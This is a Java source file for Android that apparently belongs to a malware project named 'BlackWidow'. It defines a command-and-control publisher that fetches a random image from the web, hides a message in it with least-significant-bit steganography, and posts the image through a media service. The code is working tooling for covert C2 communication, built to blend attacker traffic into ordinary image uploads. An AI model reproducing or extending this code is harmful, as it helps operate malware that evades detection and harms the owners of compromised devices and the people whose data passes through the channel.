package services;


import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

import org.jetbrains.annotations.NotNull;

import Steganography.Encoder;
import Steganography.LsbEncoder;
import exceptions.BlackWidowException;
import exceptions.BlackWidowListenerException;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;

public class C2MediaPublisher<S extends MediaService> implements C2Publisher {
    private static final String FILE_LOCATION = "DownloadedImage";
    private static final String RANDOM_IMAGE_URL = "https://source.unsplash.com/random";
    private static final int MAX_WIDTH = 900;
    private static final int MAX_HEIGHT = 900;
    private static final int COMPRESS_RATE = 100;
    public static final boolean FILTER = false;

    private S mediaService;
    private Encoder<Bitmap, String> encoder;
    private String baseFilePath;

    public C2MediaPublisher(String baseFilePath, S mediaService) {
        encoder = new LsbEncoder();
        this.mediaService = mediaService;
        this.baseFilePath = baseFilePath;
    }

    public void publishMessage(String message) throws BlackWidowException {
        Bitmap image = null;
        try {
            URL url = new URL(RANDOM_IMAGE_URL);
            image = BitmapFactory.decodeStream(url.openConnection().getInputStream());
        } catch (IOException e) {
            throw new BlackWidowListenerException("Could not download random image", e);
        }

        image = Bitmap.createScaledBitmap(image, MAX_WIDTH, MAX_HEIGHT, FILTER);
        Bitmap encoded = encoder.encode(image, message);
        File encodedFile = new File(buildMediaPath());
        try (FileOutputStream out = new FileOutputStream(encodedFile)) {
            encoded.compress(Bitmap.CompressFormat.PNG, COMPRESS_RATE, out);
        } catch (IOException e) {
            throw new BlackWidowListenerException("Could not upload image", e);
        }
        mediaService.postMedia(encodedFile);
        encodedFile.delete();
    }

    @NotNull
    private String buildMediaPath() {
        return baseFilePath + "/" + FILE_LOCATION;
    }
}